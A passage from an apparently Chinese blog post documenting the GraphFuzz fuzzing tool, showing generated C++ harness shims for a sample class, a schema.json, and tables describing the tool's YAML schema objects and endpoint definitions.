_i0-&gt;<span class="hljs-built_in">check</span>();<br>    _o0 = _i0;<br>                        <br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br>}<br></code></pre></td></tr></tbody></table></figure><hr><ul><li><code>fuzz_write.cpp</code>核心代码：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* CPPScope(name=(auto) Foo::Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_0</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = MAKE(Foo);\n        Foo ref = Foo();\n        *"</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = ref;"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::~Foo();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_1</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        free("</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">");"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void write(char val);) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_2</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">char</span> _a0;<br>    <span class="hljs-built_in">memcpy</span>(&amp;_a0, context + <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">"-&gt;write("</span> &lt;&lt; (<span class="hljs-type">int</span>)_a0 &lt;&lt; <span class="hljs-string">");\n        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br><br><br><span class="hljs-comment">/* CPPScope(name=(auto) Foo::void check();) */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shim_3</span><span class="hljs-params">(<span class="hljs-type">void</span> **in_ref, <span class="hljs-type">void</span> **out_ref, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *context)</span> </span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _i0 = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(in_ref[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _o0 = CURR_ID++;<br>    std::cout &lt;&lt; <span class="hljs-string">"    Foo *var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    {"</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">"        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">"-&gt;check();\n        "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _o0 &lt;&lt; <span class="hljs-string">" = "</span> &lt;&lt; <span class="hljs-string">"var_"</span> &lt;&lt; _i0 &lt;&lt; <span class="hljs-string">";"</span> &lt;&lt; std::endl;<br>    out_ref[<span class="hljs-number">0</span>] = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span> *&gt;(_o0);<br><br>    std::cout &lt;&lt; <span class="hljs-string">"    }"</span> &lt;&lt; std::endl;<br>}<br></code></pre></td></tr></tbody></table></figure><hr><ul><li><code>schema.json</code>内容如下：</li></ul><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"types"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Foo"</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"scopes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::Foo();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::~Foo();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::void write(char val);"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><br><span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"(auto) Foo::void check();"</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">}</span><br></code></pre></td></tr></tbody></table></figure><h3 id="B-模式格式（-star-）"><a href="#B-模式格式（-star-）" class="headerlink" title="B. 模式格式（:star:）"></a>B. 模式格式（<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）</h3><ul><li>‎一个 GraphFuzz 模式是用 YAML 编写的模式对象的键值映射：‎</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">object1:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">...</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">object1</span><br>    <span class="hljs-string">...</span><br><span class="hljs-attr">object2:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">...</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">object2</span><br>    <span class="hljs-string">...</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></tbody></table></figure><h4 id="a-可用对象"><a href="#a-可用对象" class="headerlink" title="a. 可用对象"></a>a. 可用对象</h4><h5 id="结构体-x2F-类"><a href="#结构体-x2F-类" class="headerlink" title="结构体/类"></a>结构体/类</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">struct_Foo:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span> <span class="hljs-comment"># (or type: class)</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>    <span class="hljs-attr">headers:</span> [<span class="hljs-string">'foo.h'</span>]<br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">~Foo()</span><br>    <span class="hljs-attr">static_methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Foo</span> <span class="hljs-string">*</span> <span class="hljs-string">MakeFoo(int)</span><br></code></pre></td></tr></tbody></table></figure><p>属性：</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>struct</code> 或 <code>class</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>类的名字（如 <code>Foo</code>） 或一个模板实例的名字（如 <code>Foo&lt;int&gt;</code>）.</td></tr><tr><td><code>methods</code></td><td><code>List[endpoint]</code></td><td><code>[]</code></td><td>实例方法的列表（签名或端点对象）</td></tr><tr><td><code>static_methods</code></td><td><code>List[endpoint]</code></td><td><code>[]</code></td><td>静态方法的列表（签名或端点对象）</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>包含所有封闭方法定义的C++头文件列表</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>包含所有封闭方法定义的C头文件列表</td></tr><tr><td><code>default_destructor</code></td><td><code>bool</code></td><td><code>false</code></td><td>如果为 <code>true</code>, 则添加一个默认的析构函数端点（如 <code>void ~Foo()</code>）</td></tr><tr><td><code>alloc_with_new</code></td><td><code>bool</code></td><td><code>false</code></td><td>如果为 <code>true</code>, 通过<code>Foo *f = new Foo()</code> 来调用构造函数，而不是执行本地分配并使用一个复制构造函数</td></tr></tbody></table><hr><h5 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">enum_Options:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">enum</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Options</span><br>    <span class="hljs-attr">headers:</span> [<span class="hljs-string">'options.h'</span>]<br>    <span class="hljs-attr">values:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptA</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptB</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">OptC</span><br></code></pre></td></tr></tbody></table></figure><p>属性：</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>enum</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>枚举名称（如<code>Options</code>）</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>该枚举所需的C++头文件</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>该枚举所需的C头文件</td></tr><tr><td><code>values</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>枚举值列表</td></tr></tbody></table><hr><h5 id="Typedef"><a href="#Typedef" class="headerlink" title="Typedef"></a>Typedef</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># E.g.</span><br><span class="hljs-comment"># typedef float MyFoo;</span><br><br><span class="hljs-attr">typedef_foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">typedef</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">MyFoo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">'foo.h'</span>]<br>  <span class="hljs-attr">value:</span> <span class="hljs-string">float</span><br></code></pre></td></tr></tbody></table></figure><p>属性：</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>typedef</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>新创建类型的名称（如 <code>MyFoo</code>）</td></tr><tr><td><code>headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>使用该类型所需的C++头文件</td></tr><tr><td><code>c_headers</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>使用该类型所需的C头文件</td></tr><tr><td><code>value</code></td><td><code>string</code></td><td><code>''</code></td><td>类型的值</td></tr></tbody></table><hr><h5 id="Simple（基本数据类型）"><a href="#Simple（基本数据类型）" class="headerlink" title="Simple（基本数据类型）"></a>Simple（基本数据类型）</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">simple_float:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">simple</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">float</span><br>  <span class="hljs-attr">context_size:</span> <span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>属性：</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>type</code></td><td><code>string</code></td><td>-</td><td><code>simple</code></td></tr><tr><td><code>name</code></td><td><code>string</code></td><td>-</td><td>内置类型的名称（如 <code>float</code>）</td></tr><tr><td><code>context_size</code></td><td><code>int</code></td><td><code>0</code></td><td>该类型字节大小</td></tr></tbody></table><h4 id="b-端点定义"><a href="#b-端点定义" class="headerlink" title="b. 端点定义"></a>b. 端点定义</h4><ul><li>端点有两种指定方式：<ol><li>（自动）提供C/C++函数签名</li><li>（手动）提供端点定义对象</li></ol></li></ul><h5 id="自动生成端点"><a href="#自动生成端点" class="headerlink" title="自动生成端点"></a>自动生成端点</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">doBar(Bar</span> <span class="hljs-string">*,</span> <span class="hljs-string">int)</span><br></code></pre></td></tr></tbody></table></figure><p>GraphFuzz使用下面的逻辑来决定如何解释端点签名（类似于正则匹配）：</p><table><thead><tr><th>condition</th><th>result</th></tr></thead><tbody><tr><td>in <code>methods</code> and matches <code>void &lt;name&gt;(...)</code>?</td><td>standard constructor</td></tr><tr><td>in <code>methods</code> and matches <code>void ~&lt;name&gt;(...)</code>?</td><td>destructor</td></tr><tr><td>in <code>methods</code>?</td><td>instance method</td></tr><tr><td>in <code>static_methods</code> and return type is <code>&lt;name&gt; *</code>?</td><td>static constructor</td></tr><tr><td>in <code>static_methods</code>?</td><td>static function</td></tr></tbody></table><h5 id="手动生成端点"><a href="#手动生成端点" class="headerlink" title="手动生成端点"></a>手动生成端点</h5><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">my_endpoint:</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>, <span class="hljs-string">'Bar'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Bar'</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">'int'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;doFoo($i1, $a0);</span><br><span class="hljs-string">        $o0 = $i1;</span><br></code></pre></td></tr></tbody></table></figure><p>属性：</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>inputs</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>实时输入类型的列表</td></tr><tr><td><code>outputs</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>实时输出类型的列表</td></tr><tr><td><code>args</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>上下文参数列表。这里可以使用长度固定的数组，如 <code>int[10]</code> 或 <code>char[256]</code>。</td></tr><tr><td><code>exec</code></td><td><code>string</code></td><td><code>''</code></td><td>执行模板 (C/C++)。 <code>$(i/o/a)N</code> 宏分别引用第N个输入/输出/参数对象</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
